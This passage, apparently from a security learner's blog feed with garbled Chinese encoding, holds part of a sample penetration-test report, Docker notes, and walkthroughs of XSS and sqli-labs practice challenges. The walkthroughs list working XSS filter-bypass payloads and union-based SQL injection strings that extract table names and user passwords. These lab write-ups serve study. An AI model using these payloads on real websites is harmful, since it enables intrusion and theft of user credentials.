href="#é£é™©ç­‰çº§èŒƒå›´" class="headerlink" title="é£é™©ç­‰çº§èŒƒå›´"></a>é£é™©ç­‰çº§èŒƒå›´</h3><p>é‰´äºNIST SP 800-30ï¼Œæ¼æ´æŒ‰ç…§ç›¸ä¼¼æ€§åŠå½±å“æ’åˆ—ã€‚<br>é»˜è®¤çš„æˆ–å¼±çš„å‡­è¯<br>çº§åˆ«ï¼šé«˜<br>æè¿°ï¼šä¸€ä¸ªå…¬å…±ç®¡ç†ç•Œé¢ä»…é ä¸€ä¸ªå¼±å¯†é’¥ä¿æŠ¤ã€‚<br>å½±å“ï¼šä»…é æš´åŠ›ç ´è§£ï¼Œå°±å¯èƒ½çˆ†å‡ºSQLite ManageræœåŠ¡çš„ç®¡ç†å‘˜å¯†ç ã€‚å› ä¸ºç¼ºå°‘é¢å¤–çš„æˆæƒå‡­è¯ï¼Œè¿™ä¹Ÿå¯èƒ½çˆ†å‡ºæ‰€æœ‰ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼ã€‚å¦‚æœå¯†ç ä¼šé‡ç”¨ï¼Œé‚£ä¹ˆçˆ†å‡ºæ˜æ–‡å¯†ç å¯ä»¥è¿›ä¸€æ­¥æ”»å‡»ç›®æ ‡ç³»ç»Ÿã€‚<br>ä¿®å¤ï¼šç¡®ä¿æ‰€æœ‰çš„ç®¡ç†ç•Œé¢å—å¼ºå¯†ç æˆ–å£ä»¤ä¿æŠ¤ã€‚é¿å…ä½¿ç”¨æ™®é€šçš„æˆ–å’Œä¸šåŠ¡ç›¸å…³çš„å¯†ç ï¼Œå› ä¸ºå¯ä»¥å¾ˆå®¹æ˜“é€šè¿‡å­—å…¸ç”Ÿæˆã€‚</p><h3 id="å¯†ç é‡ç”¨"><a href="#å¯†ç é‡ç”¨" class="headerlink" title="å¯†ç é‡ç”¨"></a>å¯†ç é‡ç”¨</h3><p>çº§åˆ«ï¼šé«˜<br>æè¿°ï¼šâ€œmikeâ€œåœ¨SQLite Managerå’Œä¸ªäººè®¡ç®—æœºä¸Šç”¨äº†ç›¸åŒçš„å¯†ç ã€‚<br>å½±å“ï¼šé‡å¤ç”¨ç›¸åŒçš„å¯†ç æ˜¯ä¸€ä¸ªéå¸¸å·®çš„ä¹ æƒ¯ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚è¿™ä¸ªæ¼æ´çš„å½±å“å¾ˆæ¶åŠ£ï¼Œå› ä¸ºå¤–éƒ¨æ”»å‡»è€…ç›´æ¥è·å¾—äº†å†…ç½‘è®¡ç®—æœºçš„æœ‰æ•ˆå‡­è¯ã€‚è¿™å¯èƒ½æš´éœ²æ›´å¤šçš„å¯æ”»å‡»çš„ç•Œé¢ã€‚<br>ä¿®å¤ï¼šå‡çº§å¯†ç ç®¡ç†ç­–ç•¥ï¼Œæ‰€æœ‰éš”ç¦»æœåŠ¡å¼ºåˆ¶ä½¿ç”¨å¤æ‚çš„ï¼Œä¸åŒçš„å¯†ç ã€‚å¯†ç ç®¡ç†ç³»ç»Ÿè¦ä½¿é›‡å‘˜æ–¹ä¾¿çš„ä½¿ç”¨ä¸åŒçš„å¯†ç è¿›å…¥ä¸åŒçš„ç³»ç»Ÿã€‚</p><h3 id="å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç "><a href="#å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç " class="headerlink" title="å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç "></a>å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç </h3><p>çº§åˆ«ï¼šé«˜<br>æè¿°ï¼šå¤šå°ä¸»æœºä½¿ç”¨äº†ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚<br>å½±å“ï¼šMegaCorp Oneä½¿ç”¨ç»„ç­–ç•¥æ¥è®¾ç½®GPOå†…æ‰€æœ‰ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚ç»“æœï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è‘—åçš„æ”»å‡»å·¥å…·â€œPASS-THE-HASHâ€œæ¥æ”»å‡»ï¼Œç™»å½•æ‰€æœ‰ä½¿ç”¨ç›¸åŒå¯†ç åŠç›¸åŒå¯†ç å“ˆå¸Œå€¼çš„ä¸»æœºã€‚å¦‚æ­¤ï¼Œæ”»å‡»è€…ä¸ç”¨ç ´è¯‘å¯†ç å“ˆå¸Œå€¼ï¼Œå¤§å¤§å¢åŠ äº†å®‰å…¨é£é™©ã€‚<br>ä¿®å¤ï¼šå¼ºçƒˆå»ºè®®ç¦æ­¢ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ã€‚å®åœ¨è¦ç”¨çš„è¯ï¼Œåº”åˆ†é…ä¸€ä¸ªä¸åŒçš„åå­—åŠå¤æ‚éšæœºçš„å¯†ç ã€‚</p><h3 id="è¡¥ä¸ç®¡ç†"><a href="#è¡¥ä¸ç®¡ç†" class="headerlink" title="è¡¥ä¸ç®¡ç†"></a>è¡¥ä¸ç®¡ç†</h3><p>çº§åˆ«ï¼šé«˜<br>æè¿°ï¼šMegaCorp Oneå†…å¤–éƒ¨ç¯å¢ƒä¸­æœ‰è®¸å¤šæœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿå’Œç¨‹åºã€‚<br>å½±å“ï¼šå¼±æˆæƒæœºåˆ¶å’Œæœªæ‰“è¡¥ä¸çš„ä¸»æœºï¼Œéƒ½åŒ…å«å¯ä»¥ç”¨çˆ†ç ´çš„æ¼æ´ï¼Œè¿™ä¼šä½¿å¾—æ”»å‡»è€…ä»¥æœªæˆæƒçš„æ–¹å¼å¾—åˆ°å¤§é‡çš„å…¬å¸èµ„äº§ã€‚ç‰¹åˆ«åœ°ï¼Œä¾‹å¦‚SQLiite ManageråŒ…å«è¿œç¨‹æ‰§è¡Œä»£ç çš„æ¼æ´ï¼Œåº•å±‚ä¸»æœºä¹Ÿæœ‰ä¸€ä¸ªæœ¬åœ°ææƒçš„æ¼æ´ï¼Œè¿™äº›å¯ä»¥ä½¿å¯¹å¤–å¼€æ”¾çš„ä¸»æœºè½»æ˜“åœ°è¢«æ”»é™·ã€‚è¡¨æ˜äº†è¡¥ä¸ç®¡ç†ç­–ç•¥ä»¥åŠå¼ºåˆ¶æ‰§è¡Œçš„ä¸è¶³ã€‚<br>ä¿®å¤ï¼šæ‰€æœ‰çš„å…¬å¸èµ„äº§éƒ½è¦åŠæ—¶æ‰“ä¸Šä¾›åº”å•†æä¾›çš„è¡¥ä¸ã€‚è¦å®Œæˆè¿™äº›å¯ä»¥ä½¿ç”¨ä¾›åº”å•†å®˜æ–¹å·¥å…·æˆ–è€…ç¬¬ä¸‰æ–¹ç¨‹åºï¼Œè¿™äº›éƒ½èƒ½æ£€æŸ¥å‡ºæœªåº”ç”¨çš„è¡¥ä¸ã€‚åœ¨è®¸å¤šä¾‹å­ä¸­ï¼Œç¬¬ä¸‰æ–¹å·¥å…·ä¹Ÿå¯ä»¥ç”¨æ¥åœ¨ä¸€ä¸ªæ··ä¹±çš„ç¯å¢ƒä¸­è¿›è¡Œè¡¥ä¸éƒ¨ç½²ã€‚</p><h3 id="DNSåŒºåŸŸä¼ é€"><a href="#DNSåŒºåŸŸä¼ é€" class="headerlink" title="DNSåŒºåŸŸä¼ é€"></a>DNSåŒºåŸŸä¼ é€</h3><p>çº§åˆ«ï¼šä½<br>æè¿°ï¼šä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨å…è®¸æ— é™åˆ¶çš„åŒºåŸŸä¼ é€ã€‚<br>å½±å“ï¼šä¸€ä¸ªé…ç½®æˆå¯ä¸ä»»ä½•DNSæœåŠ¡å™¨ä¼ è¾“æ•°æ®çš„DNSæœåŠ¡å™¨ï¼Œä¼šæ³„éœ²å…³äºå…¬å¸èµ„äº§å’Œç½‘ç»œå¸ƒå±€ç­‰æ•æ„Ÿä¿¡æ¯ã€‚<br>ä¿®å¤ï¼šDNSåŒºåŸŸä¼ é€éœ€ä»…å¯¹å·²è¯æ˜çš„æœåŠ¡å™¨å¼€æ”¾ã€‚</p><h3 id="é»˜è®¤APACHEæ–‡ä»¶ç›®å½•"><a href="#é»˜è®¤APACHEæ–‡ä»¶ç›®å½•" class="headerlink" title="é»˜è®¤APACHEæ–‡ä»¶ç›®å½•"></a>é»˜è®¤APACHEæ–‡ä»¶ç›®å½•</h3><p>çº§åˆ«ï¼šä½<br>æè¿°ï¼šåœ¨admin.megacorpone.comä¸»æœºä¸Šå‘ç°äº†é»˜è®¤çš„Apacheæ–‡ä»¶ç›®å½•ã€‚<br>å½±å“ï¼šæ”»å‡»è€…é€šè¿‡æ£€æŸ¥é»˜è®¤æ–‡ä»¶å¤¹å¯èƒ½çŒœå‡ºApacheæœåŠ¡å™¨çš„ç‰ˆæœ¬ã€‚æ•æ„Ÿä¿¡æ¯ä¹Ÿå¯èƒ½æ³„éœ²ã€‚<br>ä¿®å¤ï¼šç§»é™¤å…¬å¼€ç½‘ç«™çš„æ‰€æœ‰é»˜è®¤æ–‡ä»¶ã€‚</p><h2 id="é™„å½•B-å…³äºOffensive-Security"><a href="#é™„å½•B-å…³äºOffensive-Security" class="headerlink" title="é™„å½•B:å…³äºOffensive Security"></a>é™„å½•B:å…³äºOffensive Security</h2><p>Offensive Securityæå€¡é»‘ç›’æ¸—é€æµ‹è¯•è€Œåå¯¹ç™½ç›’æ¸—é€æµ‹è¯•ã€‚ç™½ç›’æ¸—é€æµ‹è¯•è¿‘å‡ å¹´æ¥å¾ˆç«ï¼Œå› ä¸ºåœ¨ä»…è¦å®ç°å¸¸è§„éœ€æ±‚çš„åœ°æ–¹ï¼Œç®€åŒ–äº†è¯„ä¼°æ–¹æ³•ã€‚å…¶ä½œä¸ºæ¼æ´æ‰«ææ–¹æ³•ï¼Œä¼šæœ‰é€‰æ‹©çš„ç¡®è®¤å‘ç°çš„é—®é¢˜ã€‚è¿™è®©æœåŠ¡ä¾›åº”å•†æœ‰èƒ½åŠ›æ‰©å¤§å·¥ä½œé‡ï¼Œå› ä¸ºä½¿ç”¨äº†è‡ªåŠ¨åŒ–çš„å·¥å…·ï¼Œå¹¶ä¸”é€šè¿‡è¯ä¹¦ç»´æŒäº§å“é—´çš„è”åŠ¨ã€‚<br>é»‘ç›’æ˜¯åœ¨å—æ§ç¯å¢ƒä¸‹çš„æ”»å‡»æ¨¡æ‹Ÿå½¢å¼ï¼Œéå¸¸æ¥è¿‘ç°å®ç¯å¢ƒï¼Œç»„ç»‡ä¼šæ—¶ä¸æ—¶çš„é¢ä¸´æ”»å‡»ã€‚é»‘ç›’æµ‹è¯•æ˜¯åŸºäºç›®æ ‡çš„è¯„ä¼°æ–¹æ³•ï¼Œä¸ä»…ä»…æ˜¯å‘ç°ä¸€ä¸ªç®€å•çš„æ¼æ´ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªæ¼æ´çœŸæ­£çš„å•†ä¸šå½±å“ã€‚é»‘ç›’æµ‹è¯•ä¼šæ‰¾åˆ°é‚£äº›ä¿®å¤åèƒ½å¸¦æ¥æœ€é«˜å•†ä¸šå›æŠ¥çš„åŒºåŸŸã€‚<br>é»‘ç›’æµ‹è¯•é€šå¸¸éœ€è¦å¾ˆé«˜çš„ä¸“ä¸šçŸ¥è¯†ã€‚æ­£å¦‚æŠ¥å‘Šä¸­æ˜¾ç¤ºçš„é‚£æ ·ï¼ŒOffensive Securityåšä¿¡å½“è¿›è¡Œé»‘ç›’æµ‹è¯•æ—¶è¾“å‡ºæ­£ç¡®æœ‰æ•ˆçš„ç»“æœæ˜¯æ£€éªŒåˆæ ¼çš„å”¯ä¸€æ–¹å¼ï¼Œå› ä¸ºæˆ‘ä»¬ä¸“ä¸šçš„å®‰å…¨å›¢é˜Ÿè¿ç”¨äº†å¾ˆé«˜ä¸“ä¸šçŸ¥è¯†ã€‚Offensive Securityä¼šé›†ä¸­åŠ›é‡è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–ç€å…¶ä»–å‚ä¸çš„é¡¹ç›®ã€‚è¿™æ„å‘³ç€æ— è®ºä»€ä¹ˆéƒ½å‚ä¸åˆ°æä¾›æœåŠ¡ä¸­ï¼Œä¾‹å¦‚æ ‡å‡†å·¥å…·Kali Linuxï¼Œç•…é”€ä¹¦çš„ä½œè€…ï¼ŒO-dayæ¼æ´çš„å‘ç°è€…ï¼Œæˆ–æ˜¯å¦‚Exploit-DBçš„ç»´æŠ¤è€…ã€‚<br>Offensive Securityæä¾›çš„äº§å“ä¸å¸‚åœºéœ€æ±‚ä¸é…å¯¹ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¸ä¼šé€‚åˆä»»ä¸€å·¥ä½œã€‚Offensive Securityç‰¹åˆ«æä¾›å’¨è¯¢æœåŠ¡ï¼Œåº•å®¹é‡å’Œé«˜è´¨é‡çš„æ¯”ä¾‹ä½¿å¾—å‘˜å·¥èƒ½æ›´æ¥è¿‘çš„æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„æ”»å‡»ã€‚è¿™ä¹Ÿå…è®¸åœ¨ä¿æŒæˆæœ¬åˆç†çš„åŒæ—¶ï¼Œå®¢æˆ·å¯ä»¥æ›´å¤šåœ°è·å¾—è¡Œä¸šè®¤å¯çš„ä¸“ä¸šçŸ¥è¯†ã€‚ä¾‹å¦‚ï¼Œå¤§æ‰¹é‡/å¿«é€Ÿå‘¨è½¬æœåŠ¡é€šå¸¸ä¸é€‚åˆæˆ‘ä»¬ã€‚Offensive Securityä¸“æ³¨ä¸é¢†å¯¼é«˜è´¨é‡ï¼Œé«˜å½±å“çš„è¯„ä¼°æ´»åŠ¨ï¼Œç§¯æåœ°å¯»æ±‚å…¶ä»–ä¾›åº”å•†æ— æ³•æä¾›æœåŠ¡çš„å®¢æˆ·ã€‚<br>è¯·é€šè¿‡<a href="mailto:info@offsec.com" target="_blank" rel="noopener">info@offsec.com</a>è”ç³»æˆ‘ä»¬ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> penetation test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerå­¦ä¹ ç¬”è®°</title>
      <link href="/2019/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>sudo add-apt-repository \<br>   â€œdeb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> \<br>   $(lsb_release -cs) \<br>   stableâ€</p><p><a href="https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/</a><br><a id="more"></a></p><p>é…ç½®å®Œé•œåƒæºåï¼Œè®°å¾—é‡å¯</p><p>/bin/sh<br>/bin/bash<br>è¿è¡Œshell</p><p>docker run â€“name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=â€123456â€ -d mysql:5.7</p><p>docker run -p 8888:5000 â€“name myfirstapp YOUR_USERNAME/myfirstapp</p><ul><li>Running on <a href="http://0.0.0.0:5000/" target="_blank" rel="noopener">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)</li></ul><p> docker rm <code>docker ps -a -q</code></p><p> docker rmi <code>docker images -q</code></p><p> docker run -p 4000:80 â€“name py-http6 â€“link mariadb:mysql finsenty/http5</p><p> mysql.connecter æŸ¥è¯¢åé¢å¸¦ä¸€ä¸ªï¼Œ</p><p> -u â€œ<a href="http://192.168.160.1/sqltest/post.php&quot;" target="_blank" rel="noopener">http://192.168.160.1/sqltest/post.php&quot;</a> â€“forms</p><p> docker run -d -p 4000:80 â€“link mysql:mysql â€“name http6 finsenty/http5</p><p>docker build -t finsenty/http5 .</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS 20å…³æŒ‘æˆ˜</title>
      <link href="/2019/03/01/xss/"/>
      <url>/2019/03/01/xss/</url>
      
        <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>åå°„å‹XSSä¹Ÿè¢«ç§°ä¸ºéæŒä¹…æ€§CSS<br>å½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªå¸¦æœ‰XSSä»£ç çš„URLè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶æ•°æ®åå¤„ç†ï¼Œç„¶åæŠŠå¸¦æœ‰XSSä»£ç çš„æ•°æ®å‘é€åˆ°æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ•°æ®åï¼Œæœ€ç»ˆé€ æˆXSSæ¼æ´ã€‚</p><p>alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ª OK æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚</p><p>æŸ¥çœ‹æºç <code>window.alert = function()</code><br><code>echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>æ²¡æœ‰è¿‡æ»¤<br>ç›´æ¥è°ƒç”¨å‡½æ•°å°±å¯ä»¥é€šå…³<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p><p><em><code>&lt;script&gt;</code> æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚</em></p><a id="more"></a><hr><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>åˆ©ç”¨é¡µé¢å…ƒç´ çœ‹åˆ°è¾“å…¥åœ¨<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>é—­åˆinputè¯­å¥å³å¯<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p><p><a href="https://imgchr.com/i/kqT7Ed" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p><hr><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>æŸ¥çœ‹é¡µé¢å…ƒç´ <code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>åœ¨inputè¯­å¥é‡Œ<br>å°è¯•é—­åˆæ— ç”¨<br>æŸ¥çœ‹æºç <code>str</code>éƒ½åŠ ä¸Šäº†<code>htmlspecialchars</code>å‡½æ•°ï¼Œä½†é»˜è®¤é…ç½®æ˜¯ä¸è¿‡æ»¤å•å¼•å·çš„<br><code>&#39;onmouseover=&#39;window.alert()</code>å³å¯</p><p>è¾“å…¥<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>è¾“å…¥<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>è¾“å…¥<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>è¾“å…¥<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p><hr><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>è¾“å…¥<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>æŸ¥çœ‹å¯çŸ¥<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>è¿‡æ»¤äº†<code>&lt;</code> <code>&gt;</code><br>åˆ©ç”¨ä¸ŠèŠ‚æ–¹æ³•<br><code>&quot;onclick=&quot;alert()</code></p><p>æ›´æ–°äº2019-03-03 11:19:50 æ˜ŸæœŸæ—¥</p><hr><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>è¯•è¿‡åå‘ç°<code>onclick</code>å˜ä¸º<code>o_nclick</code><br><code>script</code>å˜ä¸º<code>sc_ript</code><br>ä½¿ç”¨<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p><hr><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>è¾“å…¥åéƒ½è¿›è¡Œäº†å˜åŒ–<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>è¿›è¡Œå¤§å°å†™æ›¿æ¢å¯ä»¥</p><hr><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>è¢«è¿‡æ»¤ï¼Œæ”¹å˜å¤§å°å†™ä¹Ÿæ²¡æœ‰ç”¨<br><code>on</code>è¢«è¿‡æ»¤<br><code>href</code>åŒæ ·å¦‚æ­¤<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>åˆ©ç”¨åŒå†™ç»•è¿‡</p><p>æ›´æ–°äº2019-03-06 21:20:39 æ˜ŸæœŸä¸‰</p><hr><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>è¿™é¢˜å¯ä»¥æ·»åŠ é“¾æ¥<br>ç›´æ¥ä½¿ç”¨<code>javascript:alert(1)</code><br>ä½†å¹¶æ²¡æœ‰ç”¨ï¼ŒæŸ¥çœ‹æºç <code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>è¢«æ›¿æ¢äº†<br>ä½¿ç”¨åˆ¶è¡¨ç¬¦ç»•è¿‡<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=æ·»åŠ å‹æƒ…é“¾æ¥</code></p><hr><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>ä¸Šé¢˜ç»“æœæ²¡æœ‰ç”¨ï¼ŒæŸ¥çœ‹æºç <code>if(false===strpos($str7,&#39;http://&#39;))</code><br>çŸ¥ä¸€å®šè¦æœ‰<code>http://</code><br>åœ¨javascriptä¼ªåè®®é‡Œé¢ï¼Œå±äºjsèŒƒç•´ï¼Œæ‰€ä»¥å•è¡Œæ³¨é‡Šç¬¦æ˜¯å¯ä»¥ä½¿ç”¨çš„<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p><hr><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>æŸ¥çœ‹é¡µé¢å…ƒç´ <br><a href="https://imgchr.com/i/AdFKeI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>æœ‰å‡ ä¸ªéšè—çš„å€¼ï¼Œæ³¨å…¥ç‚¹å°±åœ¨è¿™<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p><hr><h2 id="æ›´æ–°äº2019-03-27-18-15-42-æ˜ŸæœŸä¸‰"><a href="#æ›´æ–°äº2019-03-27-18-15-42-æ˜ŸæœŸä¸‰" class="headerlink" title="æ›´æ–°äº2019-03-27 18:15:42 æ˜ŸæœŸä¸‰"></a>æ›´æ–°äº2019-03-27 18:15:42 æ˜ŸæœŸä¸‰</h2>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs(less-1__less-22)</title>
      <link href="/2019/02/26/sqli-labs/"/>
      <url>/2019/02/26/sqli-labs/</url>
      
        <content type="html"><![CDATA[<hr><p><strong>é—­åˆæœ‰<code>&#39;</code> <code>&quot;</code> <code>)</code> å•åŒå¼•å·ä¸èƒ½åŒæ—¶å­˜åœ¨ï¼Œ<code>)</code> å¯æœ‰å¤šä¸ª</strong></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote><p>single å•ä¸ªçš„<br>quote å¼•å·<br>å˜é‡å‰é¢åŠ  <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p></blockquote><p>åœ¨Less-1é‡Œçš„index.phpä¸­æ·»åŠ  <code>echo $sql;</code> å¯åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºæŸ¥è¯¢ä»£ç ï¼Œ<code>echo &quot;&lt;br&gt;&quot;;</code> è¡¨ç¤ºæ¢è¡Œ</p><a id="more"></a><hr><ol><li><ul><li><code>?id=1&#39;  and 1=1 --+</code> æ²¡æœ‰æŠ¥é”™ï¼Œè¿”å›æ­£ç¡®ç»“æœ</li><li><code>?id=10&#39;</code> æŠ¥é”™ <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li><li><code>?id=1&#39; and 1=2 --+</code> æ²¡æœ‰æ­£ç¡®ç»“æœ<br>ç»è¿‡è¿™ä¸‰ä¸ªæ­¥éª¤è¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥</li></ul></li><li><p>ä½¿ç”¨order byæ¥åˆ¤æ–­æœ‰å‡ ä¸ªå­—æ®µ<br><code>?id=1&#39; order by 4--+</code><br>æŠ¥é”™<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>è¯´æ˜æœ‰3ä¸ªå­—æ®µ</p></li><li><p><code>LIMIT 0,1</code> è¡¨ç¤ºç»“æœåªæ˜¾ç¤ºä¸€è¡Œ<br><code>?id=-1&#39; union select 1,2,3 --+</code> çœ‹å“ªä¸ªå­—æ®µå¯ä»¥å›æ˜¾<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p></li><li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>å¾—åˆ°ç‰ˆæœ¬ï¼Œç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ï¼Œæ•°æ®è·¯å¾„<br><a href="https://imgchr.com/i/k7zDbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a><br><em>concat_ws å¸¦åˆ†éš”ç¬¦çš„é“¾æ¥</em></p></li><li><p><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>å¾—åˆ°å½“å‰åº“çš„è¡¨å<br><a href="https://imgchr.com/i/kHSWFg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+</code><br>æŸ¥çœ‹æ•°æ®åº“åä¿¡æ¯<br><em>group_concat è¡Œè½¬åˆ—</em></p></li><li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users è¡¨çš„åˆ—å<br><a href="https://imgchr.com/i/kHp8hQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p></li><li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>å¾—å‡ºè´¦æˆ·å¯†ç <br><a href="https://imgchr.com/i/kHpan0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p></li></ol><hr><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul><li><code>?id=1&#39;</code>æŠ¥é”™</li><li><code>?id=1 and 1=1</code>æ­£ç¡®</li><li><code>?id=1 and 1=2</code>é”™è¯¯<br>å¯çŸ¥æ˜¯æ•°å­—å‹æ³¨å…¥<br><em>è§£é¢˜ä¸ç¬¬ä¸€é¢˜ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°</em></li></ul><hr><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>æŸ¥çœ‹æºç å¯çŸ¥ï¼Œç”¨<code>()</code>åŠ åœ¨äº†idä¸¤è¾¹ï¼Œæ‰€ä»¥åªè¦å°†<code>()</code>é—­åˆå°±è¡Œäº†<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p><p><a href="https://imgchr.com/i/kHbj8P" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p><hr><h2 id="Less-4"><a href="#Less-4" class="headerlink" 